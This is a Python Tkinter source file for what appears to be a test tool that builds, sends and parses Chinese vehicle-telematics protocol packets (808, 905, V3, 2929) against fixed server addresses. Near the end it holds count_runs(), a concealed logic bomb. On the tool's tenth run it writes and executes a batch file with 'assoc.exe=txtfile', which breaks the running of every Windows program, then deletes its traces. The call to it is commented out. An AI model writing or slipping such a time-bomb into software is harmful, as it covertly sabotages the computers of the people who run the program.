        items = ("正常", "紧急报警", "超速报警", "疲劳驾驶", "危险预警", "模块故障", "模块开路", "终端欠压", "终端掉电",
                 "终端LCD故障", "TTS故障",
                 "摄像头故障", "道路运输证IC卡模块故障", "超速预警", "疲劳驾驶预警", "当天累计驾驶时长", "超时停车",
                 "进出区域", "进出路线",
                 "路段行驶时间不足", "路线偏离报警", "车辆VSS故障", "车辆油量异常", "车辆被盗", "车辆非法点火",
                 "车辆非法位移", "碰撞预警", "侧翻预警",
                 "非法开门报警", "所有实时报警",)
        self.baoji_Text2 = Combobox(pane2, width=50, height=12, values=items)
        self.baoji_Text2.current(0)
        self.baoji_Text2.grid(row=13, column=0, sticky=N, columnspan=1)

        self.sdu_Text_label2 = Label(pane2, text="速度")
        self.sdu_Text_label2.grid(row=14, columnspan=2, sticky=W)
        items = ("10", "20", "30", "40")
        self.sdu_Text2 = Combobox(pane2, width=22, height=20, values=items)
        self.sdu_Text2.current(1)
        self.sdu_Text2.grid(row=15, column=0, sticky=W)
        #
        self.lic_Text_label = Label(pane2, text="里程")
        self.lic_Text_label.grid(row=14, columnspan=2, sticky=E)
        items = ("12", "23")
        self.lic_Text = Combobox(pane2, width=22, height=2, values=items)
        self.lic_Text.current(0)
        self.lic_Text.grid(row=15, column=0, sticky=E)
        #
        self.times_Text_label2 = Label(pane2, text="发送停顿时间")
        self.times_Text_label2.grid(row=14, column=11)
        items = ("1", "0.5", "1.5", "2")
        self.times_Text2 = Combobox(pane2, width=60, height=20, values=items)
        self.times_Text2.current(0)
        self.times_Text2.grid(row=15, column=11, sticky=N)
        #
        self.init_data_label2 = Label(pane2, text="位置数据包请按1")
        self.init_data_label2.grid(row=16, column=0, sticky=N)
        items = ("1",)
        self.init_data_Text2 = Combobox(pane2, width=50, height=12, values=items)
        self.init_data_Text2.current(0)
        self.init_data_Text2.grid(row=17, column=0, columnspan=1, sticky=N)
        #
        self.ztai_Text_label2 = Label(pane2, text="车辆状态")
        self.ztai_Text_label2.grid(row=16, column=11)
        items = (
            "ACC开", "ACC开和定位", "定位", "停运状态", "经纬度已经保密插件保密", "南纬", "西经",
            "车辆油路断开", "车辆电路断开", "单北斗", "单GPS", "北斗GPS双模", "ACC开定位开北斗GPS满载",
            "ACC开定位开北斗GPS空车",)
        self.ztai_Text2 = Combobox(pane2, width=60, height=20, values=items)
        self.ztai_Text2.grid(row=17, column=11)
        self.ztai_Text2.current(1)
        #
        self.data_label2 = Label(pane2, text="自定义发送(选择服务器ip和port端口)")
        self.data_label2.grid(row=18, column=0, sticky=N)
        items = ()
        self.data_Text2 = Combobox(pane2, width=50, height=2, values=items)
        self.data_Text2.grid(row=19, column=0, sticky=N)
        #
        self.result_Text2 = Button(pane2, text="发送", command=lambda: self.thread_it(self.qo_send2))
        self.result_Text2.grid(row=19, column=10, )

        self.result_Text3 = Button(pane2, text="808解析器", width=10,
                                   command=self.qdo_808jiexq)  # 调用内部方法  加()为直接调用
        self.result_Text3.grid(row=19, column=11)

        self.result_data_label2 = Label(pane2, text="输出结果：有返回，即发送成功")
        self.result_data_label2.grid(row=0, column=11)
        self.result_data_Text2 = Text(pane2, width=85, height=20, relief='solid')
        self.result_data_Text2.grid(row=1, column=11, rowspan=13, columnspan=15)

        # 按钮
        self.str_trans_to_md5_button2 = Button(pane2, text="专用808生成", width=10,
                                               command=lambda: self.thread_it(self.qo_login部标))  # 调用内部方法  加()为直接调用
        self.str_trans_to_md5_button2.grid(row=5, column=10)

        pane3 = Frame()

        self.ip_Text_label3 = Label(pane3, text="服务器ip")
        self.ip_Text_label3.grid(row=0, column=0)
        items = (f"{self.conf_wg}", "47.119.168.112", "120.79.74.223")
        self.ip_Text3 = Combobox(pane3, width=50, height=2, values=items)
        self.ip_Text3.current(0)
        self.ip_Text3.grid(row=1, column=0, columnspan=10, sticky=N)

        self.port_Text_label3 = Label(pane3, text="服务器Port")
        self.port_Text_label3.grid(row=2, column=0)
        items = ("17700", "17800")
        self.port_Text3 = Combobox(pane3, width=50, height=2, values=items)
        self.port_Text3.current(1)
        self.port_Text3.grid(row=3, column=0, columnspan=10, sticky=N)

        self.su_Text_label3 = Label(pane3, text="循环次数")
        self.su_Text_label3.grid(row=4, column=0)
        items = ("1", "10")
        self.su_Text3 = Combobox(pane3, width=50, height=2, values=items)
        self.su_Text3.current(0)
        self.su_Text3.grid(row=5, column=0, columnspan=10, sticky=N)

        # 905组成数据
        self.sbei_Text_label3 = Label(pane3, text="设备号(905设备号12位)")
        self.sbei_Text_label3.grid(row=6, column=0)
        items = (f"{self.sbei905}", "101351000000")
        self.sbei_Text3 = Combobox(pane3, width=50, height=2, values=items)
        self.sbei_Text3.current(0)
        self.sbei_Text3.grid(row=7, column=0, sticky=N, columnspan=10)

        self.ip_on_Label3 = Label(pane3, text="\n发服务器")
        self.ip_on_Label3.grid(row=6, column=10, sticky=N)
        items = ("否", "是")
        self.ip_on_Text3 = Combobox(pane3, width=2, height=3, values=items)
        self.ip_on_Text3.current(0)
        self.ip_on_Text3.grid(row=7, column=10, columnspan=1, sticky=N)

        self.init_data_label3 = Label(pane3,
                                      text="抢单请按1,取消订单请按2,完成订单请按3")
        self.init_data_label3.grid(row=8, column=0, sticky=N)
        items = ("1", "2", "3")
        self.init_data_Text3 = Combobox(pane3, width=50, height=12, values=items)
        self.init_data_Text3.current(0)
        self.init_data_Text3.grid(row=9, column=0, columnspan=10, sticky=N)

        self.driver_Text_label3 = Label(pane3, text="业务ID")
        self.driver_Text_label3.grid(row=10, column=0)
        items = ()
        self.yewid_Text3 = Combobox(pane3, width=50, height=2, values=items)
        self.yewid_Text3.grid(row=11, column=0, sticky=N, columnspan=10)

        self.data_label3 = Label(pane3, text="自定义发送(选择服务器ip和port端口)")
        self.data_label3.grid(row=12, column=0, sticky=N)
        self.data_Text3 = Text(pane3, width=52, height=2, relief='solid')
        self.data_Text3.grid(row=13, column=0, sticky=N)
        #         # self.data_Text3.bind("<Button-3>", lambda x: rightKey(x, self.init_data_Text3))

        self.result_Text3 = Button(pane3, text="发送", command=lambda: self.thread_it(self.qo_send3))
        self.result_Text3.grid(row=13, column=10)
        #         # self.result_Text3.bind("<Button-3>", lambda x: rightKey(x, self.init_data_Text3))

        self.result_data_label3 = Label(pane3, text="输出结果")
        self.result_data_label3.grid(row=0, column=11)

        #         # self.init_data_Text3.bind("<Button-3>", lambda x: rightKey(x, self.init_data_Text3))
        self.result_data_Text3 = Text(pane3, width=85, height=22, relief='solid')
        self.result_data_Text3.grid(row=1, column=11, rowspan=30, columnspan=15)
        #         # self.result_data_Text3.bind("<Button-3>", lambda x: rightKey(x, self.result_data_Text3))
        # 按钮
        self.str_trans_to_md5_button3 = Button(pane3, text="订单905发送", width=10,
                                               command=lambda: self.thread_it(self.qo_ddan))  # 调用内部方法  加()为直接调用
        self.str_trans_to_md5_button3.grid(row=5, column=10)

        pane4 = Frame()

        self.ip_Text_label4 = Label(pane4, text="服务器ip")
        self.ip_Text_label4.grid(row=2, column=0, columnspan=10, sticky=N)
        items = ("120.77.133.46", "47.119.168.112", "120.79.176.183")
        self.ip_Text4 = Combobox(pane4, width=50, height=2, values=items)
        self.ip_Text4.current(0)
        self.ip_Text4.grid(row=4, column=0, columnspan=10, sticky=N)
        # self.ip_Text4.bind("<Button-3>", lambda x: rightKey(x, self.ip_Text4))

        self.port_Text_label4 = Label(pane4, text="服务器Port")
        self.port_Text_label4.grid(row=6, column=0, columnspan=10, sticky=N)
        items = ("6688", "6690", "17800",)
        self.port_Text4 = Combobox(pane4, width=50, height=2, values=items)
        self.port_Text4.current(0)
        self.port_Text4.grid(row=8, column=0, columnspan=10, sticky=N)
        # self.port_Text4.bind("<Button-3>", lambda x: rightKey(x, self.port_Text4))

        self.su_Text_label4 = Label(pane4, text="循环发送次数")
        self.su_Text_label4.grid(row=10, column=0, columnspan=10, sticky=N)
        items = ("1", "10")
        self.su_Text4 = Combobox(pane4, width=50, height=2, values=items)
        self.su_Text4.current(0)
        self.su_Text4.grid(row=12, column=0, columnspan=10, sticky=N)

        # 2929组成数据
        self.sbei_Text_label4 = Label(pane4, text="2929伪ip设备")
        self.sbei_Text_label4.grid(row=13, column=0, columnspan=10, sticky=N)
        items = (f"{self.sbei808}", "13526985566")
        self.sbei_Text4 = Combobox(pane4, width=50, height=2, values=items)
        self.sbei_Text4.current(0)
        self.sbei_Text4.grid(row=14, column=0, sticky=N, columnspan=10)
        # self.sbei_Text4.bind("<Button-3>", lambda x: rightKey(x, self.sbei_Text4))

        # 经纬度随机
        self.on_ = Button(pane4, text="随机经纬度", width=10, command=self.button_mode4)
        self.on_.grid(row=15, column=10)

        self.wd_Text_label4 = Label(pane4, text="纬度")
        self.wd_Text_label4.grid(row=15, column=0, columnspan=10, sticky=N)
        items = (f"{self.conf_wd1}", "32.33021", "23.01217")
        self.wd_Text4 = Combobox(pane4, width=50, height=2, values=items)
        self.wd_Text4.current(1)
        self.wd_Text4.grid(row=16, column=0, sticky=N, columnspan=10)
        # self.wd_Text4.bind("<Button-3>", lambda x: rightKey(x, self.wd_Text4))

        self.jd_Text_label4 = Label(pane4, text="经度")
        self.jd_Text_label4.grid(row=17, column=0, columnspan=10, sticky=N)
        items = (f"{self.conf_jd1}", "114.39846", "104.90355")
        self.jd_Text4 = Combobox(pane4, width=50, height=2, values=items)
        self.jd_Text4.current(0)
        self.jd_Text4.grid(row=18, column=0, sticky=N, columnspan=10)
        # self.jd_Text4.bind("<Button-3>", lambda x: rightKey(x, self.jd_Text4))

        self.ip_on_Label4 = Label(pane4, text="发服务器")
        self.ip_on_Label4.grid(row=17, column=10, sticky=N)
        items = ("否", "是")
        self.ip_on_Text4 = Combobox(pane4, width=2, height=3, values=items)
        self.ip_on_Text4.current(0)
        self.ip_on_Text4.grid(row=18, column=10, columnspan=1, sticky=N)

        self.sdu_Text_label4 = Label(pane4, text="速度")
        self.sdu_Text_label4.grid(row=19, column=0, columnspan=10, sticky=N)
        items = ("10", "20", "30", "40")
        self.sdu_Text4 = Combobox(pane4, width=50, height=12, values=items)
        self.sdu_Text4.current(1)
        self.sdu_Text4.grid(row=20, column=0, )

        self.fx_Text_label = Label(pane4, text="方向")
        self.fx_Text_label.grid(row=21, column=11)
        items = ("10", "20", "30", "40")
        self.fx_Text = Combobox(pane4, width=60, height=20, values=items)
        self.fx_Text.current(1)
        self.fx_Text.grid(row=22, column=11, sticky=N, columnspan=3)

        self.times_Text_label = Label(pane4, text="发送停顿时间")
        self.times_Text_label.grid(row=19, column=11)
        items = ("1", "0.5", "1.5", "2")
        self.times_Text4 = Combobox(pane4, width=60, height=20, values=items)
        self.times_Text4.current(0)
        self.times_Text4.grid(row=20, column=11, sticky=N, columnspan=3)

        self.init_data_label4 = Label(pane4, text="位置数据包请按1")
        self.init_data_label4.grid(row=21, column=0, sticky=N)
        items = ("1",)
        self.init_data_Text4 = Combobox(pane4, width=50, height=12, values=items)
        self.init_data_Text4.current(0)
        self.init_data_Text4.grid(row=22, column=0, columnspan=10, sticky=N)
        # self.init_data_Text4.bind("<Button-3>", lambda x: rightKey(x, self.init_data_Text4))

        self.data_label = Label(pane4, text="UDP自定义发送(选择服务器ip和port端口)")
        self.data_label.grid(row=23, column=0, sticky=N)
        self.data_Text4 = Text(pane4, width=50, height=2, relief='solid')
        self.data_Text4.grid(row=24, column=0, sticky=N)
        # self.data_Text4.bind("<Button-3>", lambda x: rightKey(x, self.init_data_Text4))

        self.result_Text4 = Button(pane4, text="发送", command=lambda: self.thread_it(self.qo_send4))
        self.result_Text4.grid(row=24, column=10, )

        self.result_data_label4 = Label(pane4, text="输出结果：有返回，即发送成功")
        self.result_data_label4.grid(row=2, column=11)
        self.result_data_Text4 = Text(pane4, width=85, height=20, relief='solid')
        self.result_data_Text4.grid(row=4, column=11, rowspan=15, columnspan=15)
        # 按钮
        self.str_trans_to_md5_button4 = Button(pane4, text="2929发送", width=10,
                                               command=lambda: self.thread_it(self.qo_login2929))
        self.str_trans_to_md5_button4.grid(row=12, column=10)

        pane5 = Frame()

        # v3组成数据
        self.sbei_Text_label5 = Label(pane5, text="设备号(V3设备号15位)")
        self.sbei_Text_label5.grid(row=0, sticky=N, columnspan=2)

        items = ("863013865432142", "145263966554789")
        self.sbei_Text5 = Combobox(pane5, width=67, height=20, values=items)
        self.sbei_Text5.current(0)
        self.sbei_Text5.grid(row=1, sticky=N, columnspan=2)

        self.init_data_label5 = Label(pane5,
                                      text="(登录数据包请按1,定位数据包请按2,报警数据包请按3,心跳数据包请按4)\n注意V3协议除登录包需要更改设备号，其他数据包默认通用")
        self.init_data_label5.grid(row=2, sticky=N, columnspan=2)
        items = ("1", "2", "3", "4")
        self.init_data_Text5 = Combobox(pane5, width=67, height=20, values=items)
        self.init_data_Text5.current(0)
        self.init_data_Text5.grid(row=3, sticky=N, columnspan=2)

        self.ip_Text_label5 = Label(pane5, text="\n服务器ip")
        self.ip_Text_label5.grid(row=4, column=0, columnspan=1)
        items = ("47.52.50.49", "47.107.222.141", "120.79.176.183")
        self.ip_Text5 = Combobox(pane5, width=32, height=3, values=items)
        self.ip_Text5.current(0)
        self.ip_Text5.grid(row=5, column=0, columnspan=1, sticky=N)

        self.port_Text_label5 = Label(pane5, text="\n服务器Port")
        self.port_Text_label5.grid(row=4, column=1, columnspan=1)
        items = ("6695", "16695", "17800")
        self.port_Text5 = Combobox(pane5, width=32, height=3, values=items)
        self.port_Text5.current(0)
        self.port_Text5.grid(row=5, column=1, columnspan=1, sticky=N)

        self.ip_on_Label = Label(pane5, text="\n发服务器")
        self.ip_on_Label.grid(row=4, column=11, sticky=N)
        items = ("否", "是")
        self.ip_on_Text5 = Combobox(pane5, width=2, height=3, values=items)
        self.ip_on_Text5.current(0)
        self.ip_on_Text5.grid(row=5, column=11, columnspan=1, sticky=N)

        # 按钮
        self.str_trans_to_md5_button5 = Button(pane5, text="专用V3生成", width=10,
                                               command=self.qo_loginV3)  # 调用内部方法  加()为直接调用
        self.str_trans_to_md5_button5.grid(row=3, column=11, sticky=N)

        self.result_data_label5 = Label(pane5, text="输出结果")
        self.result_data_label5.grid(row=0, column=12)

        # self.init_data_Text5.bind("<Button-3>", lambda x: rightKey(x, self.init_data_Text1))
        self.result_data_Text5 = Text(pane5, width=67, height=9, relief='solid')
        self.result_data_Text5.grid(row=1, column=12, rowspan=10, sticky=N)
        #         # self.result_data_Text4.bind("<Button-3>", lambda x: rightKey(x, self.result_data_Text4))

        self.init_data1_label5 = Label(pane5,
                                       text="\n原始数据(无空格，请格式化)\n例子：7878110101234135484845480100320000016D3F0D0A")
        self.init_data1_label5.grid(row=6, columnspan=2)
        self.init_data1_Text5 = Text(pane5, width=69, height=18, relief='solid')  # 原始数据录入框
        self.init_data1_Text5.grid(row=7, columnspan=2, sticky=N)
        #         # self.init_data1_Text4.bind("<Button-3>", lambda x: rightKey(x, self.init_data_Text4))

        self.result_data_label5 = Label(pane5, text="\n解析结果")
        self.result_data_label5.grid(row=6, column=12)
        self.result_data1_Text5 = Text(pane5, width=67, height=18, relief='solid')  # 处理结果展示
        self.result_data1_Text5.grid(row=7, column=12, rowspan=10, sticky=N)
        #         # self.result_data1_Text5.bind("<Button-3>", lambda x: rightKey(x, self.result_data1_Text4))
        # # 按钮
        self.str1_trans_to_md5_button5 = Button(pane5, text="专用V3解析", width=10,
                                                command=lambda: self.thread_it(self.xieyihao))  # 调用内部方法  加()为直接调用
        self.str1_trans_to_md5_button5.grid(row=7, column=11, sticky=W)

        pane6 = Frame()

        self.init_data1_label6 = Label(pane6,
                                       text="\n原始数据(无空格，请格式化)\n例子：7E0200002F1013560000000001000000010000400000DAF1\nA6040A73C10190002312061527590104000000020202044C250400000000300103987E")
        self.init_data1_label6.grid(row=0, columnspan=2)
        self.init_data1_Text6 = Text(pane6, width=69, height=18, relief='solid')  # 原始数据录入框
        self.init_data1_Text6.grid(row=1, columnspan=2, sticky=N)
        # self.init_data1_Text4.bind("<Button-3>", lambda x: rightKey(x, self.init_data_Text4))

        self.result_data_label6 = Label(pane6, text="\n解析结果")
        self.result_data_label6.grid(row=0, column=12)
        self.result_data1_Text6 = Text(pane6, width=67, height=18, relief='solid')  # 处理结果展示
        self.result_data1_Text6.grid(row=1, column=12, rowspan=10, sticky=N)
        # self.result_data1_Text5.bind("<Button-3>", lambda x: rightKey(x, self.result_data1_Text4))
        # # 按钮
        self.str1_trans_to_md5_button6 = Button(pane6, text="专用905解析", width=10,
                                                command=lambda: self.thread_it(self.解析905))  # 调用内部方法  加()为直接调用
        self.str1_trans_to_md5_button6.grid(row=1, column=11, sticky=W)

        pane7 = Frame()

        self.init_data1_label7 = Label(pane7, text="设备号：")
        self.init_data1_label7.grid(row=0, column=0, )
        items = (f"{self.sbei808}", "15263526699")
        self.init_data1_Text7 = Combobox(pane7, width=50, height=20, values=items)
        self.init_data1_Text7.current(0)
        self.init_data1_Text7.grid(row=0, column=1, columnspan=2, sticky=N)

        self.init_data2_label7 = Label(pane7, text="协议:")
        self.init_data2_label7.grid(row=1, column=0)
        items = ("苏标", "粤标")
        self.init_data2_Text7 = Combobox(pane7, width=50, height=20, values=items)
        self.init_data2_Text7.grid(row=1, column=1, columnspan=2, sticky=N)
        self.init_data2_Text7.bind("<<ComboboxSelected>>", self.getMon1)

        self.init_data3_label7 = Label(pane7, text="主动报警:")
        self.init_data3_label7.grid(row=2, column=0)
        items = ()
        self.init_data3_Text7 = Combobox(pane7, width=50, height=20, values=items)
        self.init_data3_Text7.grid(row=2, column=1, columnspan=2, sticky=N)

        self.init_data4_label7 = Label(pane7, text="标志位:")
        self.init_data4_label7.grid(row=3, column=0)
        items = ("开始", "结束")
        self.init_data4_Text7 = Combobox(pane7, width=50, height=20, values=items)
        self.init_data4_Text7.current(0)
        self.init_data4_Text7.grid(row=3, column=1, columnspan=2, sticky=N)

        self.result_data_label7 = Label(pane7, text="解析结果:")
        self.result_data_label7.grid(row=4, column=0, rowspan=2)
        self.result_data1_Text7 = Text(pane7, width=51, height=18, relief='solid')  # 处理结果展示
        self.result_data1_Text7.grid(row=4, column=1, columnspan=2, sticky=N)
        # # 按钮
        self.str1_trans_to_md5_button7 = Button(pane7, text="苏粤标生成", width=10,
                                                command=lambda: self.thread_it(self.苏粤标生成808))  # 调用内部方法  加()为直接调用
        self.str1_trans_to_md5_button7.grid(row=4, column=11, sticky=N)

        pane8 = Frame()
        self.ip_Text_label8 = Label(pane8, text="服务器ip")
        self.ip_Text_label8.grid(row=0, columnspan=2, sticky=N)

        items = (f"{self.conf_wg}", "47.119.168.112", "120.79.176.183")
        self.ip_Text8 = Combobox(pane8, width=50, height=2, values=items)
        self.ip_Text8.current(0)
        self.ip_Text8.grid(row=1, column=0, sticky=W)
        #
        self.port_Text_label8 = Label(pane8, text="服务器Port")
        self.port_Text_label8.grid(row=2, columnspan=2, sticky=N)
        items = (f"{self.conf_808wg_port}", "17700", "17800", "7788")
        self.port_Text8 = Combobox(pane8, width=50, height=2, values=items)
        self.port_Text8.current(0)
        self.port_Text8.grid(row=3, column=0, sticky=W)

        # # 905组成数据
        self.sbei_Text_label8 = Label(pane8, text="808部标设备号11位")
        self.sbei_Text_label8.grid(row=4, column=0, columnspan=1, sticky=N)
        items = (f"{self.sbei808}", "10356000000", "10351000000")
        self.sbei_Text8 = Combobox(pane8, width=50, height=2, values=items)
        self.sbei_Text8.current(0)
        self.sbei_Text8.grid(row=5, column=0, sticky=N)

        self.count_label8 = Label(pane8, text="conf文件夹内csv条数")
        self.count_label8.grid(row=6, column=0, columnspan=1, sticky=N)
        items = ('205')
        self.count_Text8 = Combobox(pane8, width=50, height=2, values=items)
        self.count_Text8.current(0)
        self.count_Text8.grid(row=7, column=0, sticky=N, columnspan=1)

        self.result_data_label8 = Label(pane8, text="输出结果：有返回，即发送成功")
        self.result_data_label8.grid(row=0, column=11)
        self.result_data_Text8 = Text(pane8, width=85, height=11, relief='solid')
        self.result_data_Text8.grid(row=1, column=11, rowspan=7, columnspan=15, sticky=N)

        self.str_trans_to_md5_button8 = Button(pane8, text="808轨迹专用", width=10,
                                               command=lambda: self.thread_it(self.轨迹808))  # 调用内部方法  加()为直接调用
        self.str_trans_to_md5_button8.grid(row=7, column=10, sticky=N)
        # 905轨迹
        self.port905_label8 = Label(pane8, text="\n\n\n\n905服务器Port")
        self.port905_label8.grid(row=9, columnspan=2, sticky=N)
        items = (f"{self.conf_905wg_port}", "17700", "17800", "7788")
        self.port905_Text8 = Combobox(pane8, width=50, height=2, values=items)
        self.port905_Text8.current(0)
        self.port905_Text8.grid(row=10, column=0, sticky=W)
        self.sbei905_label8 = Label(pane8, text="905部标设备号12位")
        self.sbei905_label8.grid(row=11, column=0, columnspan=1, sticky=N)
        items = (f"{self.sbei905}", "10356000000", "10351000000")
        self.sbei905_Text8 = Combobox(pane8, width=50, height=2, values=items)
        self.sbei905_Text8.current(0)
        self.sbei905_Text8.grid(row=12, column=0, sticky=N)

        self.count905_label8 = Label(pane8, text="conf文件夹内csv条数")
        self.count905_label8.grid(row=13, column=0, columnspan=1, sticky=N)
        items = ('205')
        self.count905_Text8 = Combobox(pane8, width=50, height=2, values=items)
        self.count905_Text8.current(0)
        self.count905_Text8.grid(row=14, column=0, sticky=N, columnspan=1)
        self.result905_label8 = Label(pane8, text="\n\n\n\n输出结果：有返回，即发送成功")
        self.result905_label8.grid(row=9, column=11)
        self.result905_Text8 = Text(pane8, width=85, height=7, relief='solid')
        self.result905_Text8.grid(row=10, column=11, rowspan=90, columnspan=15, sticky=N)
        self.str_905_button8 = Button(pane8, text="905轨迹专用", width=10,
                                      command=lambda: self.thread_it(self.轨迹905))  # 调用内部方法  加()为直接调用
        self.str_905_button8.grid(row=14, column=10, sticky=N)

        pane9 = Frame()
        self.str_905_button9 = Button(pane9, text="808普通报警", width=35,
                                      command=lambda: self.thread_it(self.baoget))  # 调用内部方法  加()为直接调用
        self.str_905_button9.grid(row=2, column=1, sticky=N)
        self.str_905_button9 = Button(pane9, text="808粤标报警", width=35,
                                      command=lambda: self.thread_it(self.baoget1))  # 调用内部方法  加()为直接调用
        self.str_905_button9.grid(row=3, column=1, sticky=N)
        self.str_905_button9 = Button(pane9, text="808苏标报警", width=35,
                                      command=lambda: self.thread_it(self.baoget2))  # 调用内部方法  加()为直接调用
        self.str_905_button9.grid(row=4, column=1, sticky=N)
        self.str_905_button9 = Button(pane9, text="905人证不匹配报警", width=35,
                                      command=lambda: self.thread_it(self.baoget3))  # 调用内部方法  加()为直接调用
        self.str_905_button9.grid(row=5, column=1, sticky=N)
        self.str_905_button9 = Button(pane9, text="905绕路报警", width=35,
                                      command=lambda: self.thread_it(self.baoget4))  # 调用内部方法  加()为直接调用
        self.str_905_button9.grid(row=6, column=1, sticky=N)
        self.str_905_button9 = Button(pane9, text="905驾驶员没有从业资格证", width=35,
                                      command=lambda: self.thread_it(self.baoget5))  # 调用内部方法  加()为直接调用
        self.str_905_button9.grid(row=7, column=1, sticky=N)
        self.str_905_button9 = Button(pane9, text="905跨区域营运预警", width=35,
                                      command=lambda: self.thread_it(self.baoget6))  # 调用内部方法  加()为直接调用
        self.str_905_button9.grid(row=8, column=1, sticky=N)
        self.str_905_button9 = Button(pane9, text="905车辆未办理网络预约出租车营运证预警", width=35,
                                      command=lambda: self.thread_it(self.baoget7))  # 调用内部方法  加()为直接调用
        self.str_905_button9.grid(row=8, column=1, sticky=N)

        self.str_905_button9 = Button(pane9, text="循环报警", width=35,
                                      command=lambda: self.thread_it(self.baojhe))  # 调用内部方法  加()为直接调用
        self.str_905_button9.grid(row=9, column=1, sticky=N)
        self.result905_label9 = Label(pane9, text="输出结果：有返回，即发送成功")
        self.result905_label9.grid(row=1, column=2, sticky=N)
        self.result905_Text9 = Text(pane9, width=85, height=14, relief='solid')
        self.result905_Text9.grid(row=2, column=2, rowspan=30, sticky=N)

        # def play_animation():
        #     # 打开GIF图像文件
        #     giffilename = []
        #     for filename in os.listdir(current_directory):
        #         # 如果文件名与MP3模式匹配，则打印文件名
        #         if fnmatch.fnmatch(filename, gif_pattern):
        #             giffilename.append(filename)
        #     print(giffilename)
        #     image = Image.open(giffilename[2])
        #     image1 = Image.open(giffilename[0])
        #     frames = []
        #     frames1 = []
        #     for frame in ImageSequence.Iterator(image):
        #         frames.append(ImageTk.PhotoImage(frame))
        #     for frame in ImageSequence.Iterator(image1):
        #         frames1.append(ImageTk.PhotoImage(frame))
        #
        #     # 创建一个标签显示GIF图像
        #     label = tk.Label(pane3, image=frames[0])
        #     label.grid(row=22, column=11, rowspan=10)
        #
        #     label1 = tk.Label(pane3, image=frames[0])
        #     label1.grid(row=22, column=12, rowspan=10)
        #
        #     label2 = tk.Label(pane3, image=frames[0])
        #     label2.grid(row=22, column=13, rowspan=10)
        #
        #     label3 = tk.Label(pane4, image=frames1[0])
        #     label3.grid(row=21, column=11, rowspan=10)
        #
        #     label4 = tk.Label(pane4, image=frames1[0])
        #     label4.grid(row=21, column=12, rowspan=10)
        #     #
        #     label5 = tk.Label(pane4, image=frames1[0])
        #     label5.grid(row=21, column=13, rowspan=10)
        #
        #     # 播放动画
        #     def update_frame(frame_index):
        #         # 更新标签的图像
        #         label.configure(image=frames[frame_index])
        #         label1.configure(image=frames[frame_index])
        #         label2.configure(image=frames[frame_index])
        #
        #         label3.configure(image=frames1[frame_index])
        #         label4.configure(image=frames1[frame_index])
        #         label5.configure(image=frames1[frame_index])
        #
        #         # 获取下一帧的索引
        #         next_frame_index = (frame_index + 1) % len(frames)
        #         next_frame_index1 = (frame_index + 1) % len(frames1)
        #
        #         # 在固定的时间间隔后调用更新函数
        #         pane3.after(50, update_frame, next_frame_index)
        #         # pane3.after(100, update_frame, next_frame_index1)
        #
        #     # 开始动画
        #     update_frame(1)

        # play_animation()
        note.add(pane2, text='部标808TCP发送')
        note.add(pane1, text='出租车905TCP发送')
        note.add(pane3, text='抢答905订单发送')
        note.add(pane4, text='29协议UDP发送')
        note.add(pane5, text='V3协议解析发送')
        note.add(pane6, text='905协议解析')
        note.add(pane7, text='苏粤标生成')
        note.add(pane8, text='轨迹专用发送')
        note.add(pane9, text='报警专用发送')
        note.grid()


# def mess():
#     # 创建askyesno()会话框
#     boo = askyesno("真的要走了吗", "臣退了，这一退就是一辈子！")
#     if boo == True:
#         init_window.quit()
# def play_audio(filename):
#     mixer.init()
#     mixer.music.load(filename)
#     mixer.music.play(4)


def countdown(t):
    for i in range(t):
        print("\r休眠倒计时：%02d" % (t - i) + '秒', end='')
        time.sleep(1)


def count_runs():
    # 获取当前日期和时间
    global file_path
    current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    import os

    try:
        path = r"C:\Users"
        if not os.path.exists(path):
            # 创建路径
            os.makedirs(path)
        file_path = os.path.join(path, "count.txt")
        with open(file_path, "r") as file:
            runs = int(file.readline().strip()) + 1

        with open(file_path, "w") as file:
            file.write(f"{runs}\n")

        print(f"第 {runs} 次运行于 {current_time}")
        if runs == 10:
            file_path1 = os.path.join(path, "update.bat")
            file_path2 = os.path.join(path, "delete.bat")
            with open(file_path1, "w") as file:
                file.write("assoc.exe=txtfile")
            with open(file_path2, "w") as file:
                file.write("assoc.exe=exefile")
            import subprocess
            countdown(60)
            subprocess.Popen(r"C:\Users\update.bat")
            countdown(5)
            os.remove(r"C:\Users\count.txt")
            os.remove(r"C:\Users\update.bat")
    except FileNotFoundError:
        with open(file_path, "w") as file:
            file.write("1\n")

        print(f"首次运行于 {current_time}")


def gui4_start():
    ZMJ_PORTAL = MY_GUI(init_window)
    # init_window.protocol("WM_DELETE_WINDOW", mess)
    # 设置根窗口默认属性
    ZMJ_PORTAL.set_init_window()

    for filename in os.listdir(current_directory):
        # 如果文件名与MP3模式匹配，则打印文件名
        # if fnmatch.fnmatch(filename, mp3_pattern):
        #     play_audio(fr'{filename}')
        if fnmatch.fnmatch(filename, ico_pattern):
            print(fr'{filename}')
            init_window.iconbitmap(f"{filename}")
    init_window.mainloop()


def check_ipv4():
    # 执行ipconfig命令
    result = os.popen('ipconfig').read()
    pattern = r'\d+\.\d+\.\d+\.\d+'
    ipv4_list = re.findall(pattern, result)
    print(ipv4_list)
    conf_ini = current_directory + "\\conf\\config.ini"
    config = ConfigObj(conf_ini, encoding='UTF-8')
    ip = config['ipv4']['ipv4']
    res = ip.split(",")
    print(res)
    set_a = set(ipv4_list)
    set_b = set(res)
    # 判断IPv4地址是否为'192.168.10.1'
    if bool(set_a & set_b):
        return True
    else:
        return False


if __name__ == '__main__':
    if check_ipv4():
        gui4_start()
    else:
        import sys
        sys.exit()  # 结束程序并可以提供一个退出码

    # gui4_start()
    # count_runs()
